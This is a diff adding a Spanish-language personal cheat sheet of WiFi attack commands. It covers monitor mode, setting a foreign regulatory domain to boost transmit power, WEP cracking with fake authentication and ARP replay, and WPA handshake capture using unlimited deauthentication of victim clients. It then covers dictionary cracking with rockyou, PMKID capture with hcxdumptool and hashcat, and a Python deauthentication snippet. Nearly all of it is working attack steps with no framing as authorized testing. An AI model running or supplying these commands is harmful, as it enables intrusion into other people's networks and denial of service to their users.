@@ -1,0 +1,93 @@
+
+ver wifite
+
+sudo iw list           toda la info de la placa de red wifi
+		       Para aumentarle la potencia a la antena hay que configurarla para un país donde se permita: BZ, GY, NZ, VE   sudo iw reg get   para ver la actual
+sudo iw reg set BZ     cambia a Brazil
+
+Interfaz de red en modo monitor (escucha):
+airmon-ng
+airmon-ng check kill
+ip link set wlan0 down
+iw dev wlan0 set type monitor               o  sudo airmon-ng start wlan0
+#iw dev wlan0 set txpower fixed 30mBm
+ip link set wlan0 up
+iw wlan0 info
+
+Fin modo monitor y regreso a managed:               sudo airmon-ng stop wlan0mon
+
+Si no funciona, es porque los drivers del adaptador de red no lo permiten y hay que violentar el régimen regulatorio https://miloserdov.org/?p=337
+
+(ver si es mejor airmon-ng stop wlan0   o si solo sale de modo monitor)
+iwlist wlan0 scan   lista de redes alcanzadas y características
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Inyectar paquetes en la red (mismo canal y los solapados) para conseguir vectores de inicialización
+
+Ver   aireplay-ng   las opciones
+
+Prueba de inyección a todos:
+aireplay-ng --test wlan0mon        tiene que decir  Injection is working!, capturar la MAC del enrutador a atacar
+
+airodump-ng wlan0mon
+airodump-ng -d [MAC]       muestra los clientes conectados
+
+airodump-ng -c 6 --bssid C0:C0:C0:C0:C0:C0 -w archivoSalida wlan0mon          c es el canal, archivo de salida para wireshark
+
+aireplay-ng --fakeauth 0 -e nombreDeLaRed -a C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon      0 es el tiempo que demora en reconectar, C1 la MAC de un cliente conectado
+se autentifica
+inyectar paquetes específicos para dar con la clave de la red:
+aireplay-ng --arpreplay -b C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon
+aircrack-ng -z -b C0:C0:C0:C0:C0:C0 captura-01.cap
+
+
+
+WPA
+airodump-ng wlan0mon        ver conexiones disponibles
+airodump-ng --channel 6 --bssid 00:00:00:00:00:00 -w ~/Documents/scan wlan0mon        comienza a capturar paquetes
+aireplay-ng -0 26 -a 10:10:10:00:00:00 -c 00:00:00:00:00:00 wlan0mon                  a es el mío, c la víctima, 26 paquetes
+inyecta paquetes para acelerar la captura de tráfico
+cancelar el proceso cuando WPA handshake: 10:10:10:00:00:00
+aircrack-ng scan-01.cap -w /usr/share/wordlists/rockyou.txt
+
+Otro:    aireplay-ng --deauth 0 -a M1:M1:M1:M1:M1:M1 wlan0mon             deauth 0 significa sin límite
+desconecta el device para que vuelva a conectarse y revele el four-way handshake
+wireshark archivoSalida, filtrar eapol, buscar WPA Key Data
+aircrack-ng archivoSalida.cap -w /usr/share/wordlists/rockyou.txt
+
+
+Ataque a claves WPA con PMKID sin Deauth WPA/WPA2:
+    git clone ZerBea/hcxdumptool | apt-get install libcurl4-openssl-dev | apt-get install libssl-dev
+    cd hcxdumptool | make | sudo make install | (apt install hcxtools)
+    iniciar captura de paquetes:   sudo hcxdumptool -i wlan0 -o captura.pcapng --enable_status=1
+    decodificar el archivo para hashcat:   hcxpcaptool -E essidlista -I identidades -U usuarios -z hash.16800 captura.pcapng
+    opcional   wireshark captura.pcapng   en 802.1x Auth buscar WPA key data length mayor a 0 dentro de vendor el PMKID
+    hashcat -m 16800 hash.16800 -a 0 (--kernel-accel=1) -w 4 --force /usr/share/wordlist
+
+
+#################################################################################################################################
+
+airmon-ng check kill
+airmon-ng start wlan0
+airmon-ng
+airodump-ng wlan0mon
+airodump-ng wlan0mon -d 00:11:22:33:44:55                                  access point MAC
+
+Los siguientes dos en simultáneo:
+airodump-ng -w outputFile -c 2 --bssid 00:11:22:33:44:55 wlan0mon
+aireplay-ng --deauth 0 -a 00:11:22:33:44:55 wlan0mon                       0 es sin límite
+
+wireshark outFile-01.cap              filtrar eapol y buscar el paquete que va del access point al dispositivo, "WPA Key Data"
+airmon-ng stop wlan0mon
+aircrack-ng outFile-01.cap -w ~/Documents/psws.txt
+
+
+#################################################################################################################################
+
+Deautenticar:
+    
+    subprocess.run(["airmon-ng", "start", "wlan0mon", hackchannel])
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, "wlan0mon"])
+https://github.com/davidbombal/red-python-scripts/blob/main/wifi_dos_type1.py
+
